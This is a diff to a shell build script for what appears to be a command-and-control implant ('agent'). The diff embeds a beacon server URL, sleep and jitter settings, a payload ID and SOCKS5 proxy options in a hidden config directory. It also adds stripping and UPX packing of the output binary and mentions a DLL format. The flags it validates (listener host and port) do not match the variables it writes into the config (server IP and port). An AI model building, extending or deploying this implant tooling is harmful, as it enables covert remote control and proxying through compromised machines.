@@ -60,6 +60,12 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
+# Validate required flags
+if [ -z "$LISTENER_HOST" ] || [ -z "$LISTENER_PORT" ]; then
+  echo "Error: --listener-host and --listener-port are required" >&2
+  exit 1
+fi
+
 # Use environment variables if arguments not provided
 if [ -z "$TARGET" ]; then
     TARGET=${TARGET:-"x86_64-unknown-linux-gnu"}
@@ -129,26 +135,21 @@ if ! command -v cross &> /dev/null; then
     cargo install cross
 fi
 
-# Create config file with explicit server URL and port and payload ID
-cat > "config.json" << EOF
+# Generate agent config only in the payload output directory
+mkdir -p "$OUTPUT_DIR/.config"
+cat > "$OUTPUT_DIR/.config/config.json" << EOF
 {
     "server_url": "${SERVER_IP}:${SERVER_PORT}",
     "sleep_interval": ${SLEEP_INTERVAL:-60},
     "jitter": ${JITTER:-2},
     "payload_id": "${PAYLOAD_ID}",
-    "protocol": "http"
+    "protocol": "${PROTOCOL}",
+    "socks5_enabled": ${SOCKS5_ENABLED},
+    "socks5_port": ${SOCKS5_PORT}
 }
 EOF
 
 echo "Created configuration for build-time embedding"
-
-# Also create the config in output directory for backwards compatibility
-mkdir -p "$OUTPUT_DIR"
-cp "config.json" "$OUTPUT_DIR/config.json"
-
-# Create .config directory structure
-mkdir -p "$OUTPUT_DIR/.config"
-cp "config.json" "$OUTPUT_DIR/.config/config.json"
 
 echo "Building agent..."
 
@@ -224,6 +225,28 @@ else
     BUILD_DIR="target/$TARGET/release"
 fi
 
+# Print contents of build directory for debugging
+if [ -d "$BUILD_DIR" ]; then
+    echo "Contents of $BUILD_DIR before copy:" >&2
+    ls -la "$BUILD_DIR" >&2
+else
+    echo "Build directory $BUILD_DIR does not exist!" >&2
+fi
+
+# Copy the binary to the output directory (absolute path)
+if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
+    echo "Copying agent binary to output directory: $OUTPUT_DIR/agent$BINARY_EXT"
+    mkdir -p "$OUTPUT_DIR"
+    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent$BINARY_EXT"
+    # Timestamped copy for reference
+    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_agent$BINARY_EXT"
+    echo "Agent binary copied successfully to specified output location"
+else
+    echo "ERROR: agent binary not found at $BUILD_DIR/agent$BINARY_EXT" >&2
+    echo "Contents of $BUILD_DIR:" >&2
+    ls -la "$BUILD_DIR" >&2
+fi
+
 echo "Build complete in $BUILD_DIR"
 
 # Copy the binary to the output directory
@@ -255,6 +278,16 @@ else
     # List directory contents to aid debugging
     echo "Contents of $BUILD_DIR:"
     ls -la "$BUILD_DIR"
+fi
+
+# After copying the binary, strip and compress with upx if available
+if [ -f "$OUTPUT_DIR/agent$BINARY_EXT" ]; then
+    echo "Stripping binary..."
+    strip "$OUTPUT_DIR/agent$BINARY_EXT" || true
+    if command -v upx &> /dev/null; then
+        echo "Compressing binary with upx..."
+        upx --best --lzma "$OUTPUT_DIR/agent$BINARY_EXT"
+    fi
 fi
 
 # For DLL format, we need to properly handle DLL creation
